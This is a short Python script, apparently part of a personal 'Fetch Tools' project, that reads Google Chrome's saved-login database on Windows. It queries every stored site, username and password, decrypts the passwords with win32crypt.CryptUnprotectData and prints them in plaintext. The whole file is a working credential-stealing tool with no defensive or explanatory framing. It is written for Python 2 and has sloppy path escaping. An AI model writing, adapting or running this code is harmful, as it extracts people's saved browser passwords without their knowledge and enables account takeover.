import os
import sqlite3
import win32crypt

# This defines the pathway to the location of the user's "Login Data" file
profile_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\User Data\Default"
# This opens the "Login Data" file, which contains all the user's saved info
login_db = os.path.join(profile_path, 'Login Data')

# Connect to an SQLite db
c = sqlite3.connect(login_db)
cursor = c.cursor()
# Query to retrieve the user's info from the SQLite DB
db_query = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(db_query)

login_data = cursor.fetchall()

# URL: credentials dictionary
credential = {}

# Decrypts the information from the Login Data file, using the win32crypt package
for url, user_name, pwd, in login_data:
    pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)  # This returns a tuple description and the password
    credential[url] = (user_name, pwd[1])

# Writes output to a text file. Is saved in the Pycharm Projects folder, in the Fetch Tools project folder
for url, credentials in credential.iteritems():
    # Error checking in case there are no saved credentials for Chrome
    if credentials[1]:
        print("\n" + url + "\n" + credentials[0].encode('utf-8') + " | " + credentials[1] + "\n")
    else:
        print("\n" + url + "\n" + "No saved Google Chrome credentials found. Returning to Fetch Main Menu....\n")
else:
    quit()
